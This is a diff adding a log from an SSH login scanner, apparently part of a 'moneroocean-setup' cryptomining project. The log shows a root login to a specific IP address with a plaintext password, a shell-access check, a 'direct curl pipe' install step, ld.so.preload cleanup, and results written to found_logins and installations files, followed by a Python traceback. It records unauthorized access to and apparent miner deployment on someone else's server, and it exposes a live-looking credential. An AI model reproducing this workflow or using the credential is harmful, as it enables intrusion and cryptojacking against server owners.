@@ -1,0 +1,46 @@
+2026-11-21 11:02:10,108 - INFO     - [v3.9.5-SSH-BANNER-CHECK] Starting ultra-fast scanner with protocols: SSH and 100 threads.
+2026-11-21 11:02:11,111 - INFO     - Found 1 valid entries in ionos.txt
+2026-11-21 11:02:11,612 - DEBUG    - Submitting SSH task for 212.227.165.247:55555
+2026-11-21 11:02:11,647 - DEBUG    - 🚀 Attempting connection to 212.227.165.247:55555 for SSH
+2026-11-21 11:02:11,647 - DEBUG    - Trying ssh connection (root:55Marko55@212.227.165.247:55555)
+2026-11-21 11:02:12,045 - DEBUG    - Shell probe for root@212.227.165.247:55555: trying 'echo X'
+2026-11-21 11:02:12,159 - DEBUG    - ✅ SSH shell access VERIFIED for root@212.227.165.247:55555
+2026-11-21 11:02:12,308 - DEBUG    - sudo detected for root@212.227.165.247:55555 — flagged for root_sudo.txt via write_to_output()
+2026-11-21 11:02:12,523 - INFO     - 🐧 LINUX detected: Using direct curl pipe with temp logging priority for 212.227.165.247:55555
+2026-11-21 11:02:13,790 - DEBUG    - ld.so.preload cleanup attempted for 212.227.165.247:55555
+2026-11-21 11:02:13,790 - INFO     - Successful login to SSH protocol at 212.227.165.247:55555 with username root (shell verified)
+2026-11-21 11:02:14,134 - INFO     - 🎉 SUCCESS │ SSH://root:55Marko55@212.227.165.247:55555 │ Duration: 2.49s
+2026-11-21 11:02:14,134 - ERROR    - A task generated an exception: 'found_logins.txt'
+Traceback (most recent call last):
+  File "E:\PycharmProjects\moneroocean-setup\ecbcb633-scanner_ULTIMATE_DIRECT.py", line 3401, in process_single_file
+    future.result()
+    ~~~~~~~~~~~~~^^
+  File "C:\Users\JAMy\AppData\Local\Python\pythoncore-3.15-64\Lib\concurrent\futures\_base.py", line 447, in result
+    return self.__get_result()
+           ~~~~~~~~~~~~~~~~~^^
+  File "C:\Users\JAMy\AppData\Local\Python\pythoncore-3.15-64\Lib\concurrent\futures\_base.py", line 396, in __get_result
+    raise self._exception
+  File "C:\Users\JAMy\AppData\Local\Python\pythoncore-3.15-64\Lib\concurrent\futures\thread.py", line 86, in run
+    result = ctx.run(self.task)
+  File "C:\Users\JAMy\AppData\Local\Python\pythoncore-3.15-64\Lib\concurrent\futures\thread.py", line 73, in run
+    return fn(*args, **kwargs)
+  File "E:\PycharmProjects\moneroocean-setup\ecbcb633-scanner_ULTIMATE_DIRECT.py", line 2212, in check_login_thread
+    write_to_output(
+    ~~~~~~~~~~~~~~~^
+        protocol,
+        ^^^^^^^^^
+    ...<11 lines>...
+        shell_type=result_data[5] if len(result_data) > 5 else "Unknown",
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    )
+    ^
+  File "E:\PycharmProjects\moneroocean-setup\ecbcb633-scanner_ULTIMATE_DIRECT.py", line 3083, in write_to_output
+    ensure_file_header("found_logins.txt")
+    ~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^
+  File "E:\PycharmProjects\moneroocean-setup\ecbcb633-scanner_ULTIMATE_DIRECT.py", line 897, in ensure_file_header
+    with FILE_LOCKS[filename]:
+         ~~~~~~~~~~^^^^^^^^^^
+KeyError: 'found_logins.txt'
+2026-11-21 11:02:17,179 - INFO     - Moved processed file 'E:\PycharmProjects\convert_rootZ_to_test_format\ionos.txt' to '!checked\ionos.txt'
+2026-11-21 11:02:17,346 - INFO     - Deduplicated installations.txt: removed 0 duplicate entries
+2026-11-21 11:02:17,360 - INFO     - Deduplicated output.txt: removed 0 duplicate entries
